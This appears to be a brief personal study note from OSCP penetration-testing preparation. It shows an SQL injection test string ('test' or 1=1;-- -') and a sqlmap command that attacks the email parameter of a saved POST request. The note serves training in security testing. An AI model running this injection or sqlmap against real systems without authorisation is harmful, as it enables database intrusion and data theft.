[[Synced OSCP Notes/Tools/SQLmap|SQLmap]]

Intercept a web request of (test' or 1=1;-- -), copy the post request and save it to a file called reset.req

Feed this to SQLmap

```
sqlmap -r reset.req -p email --batch
```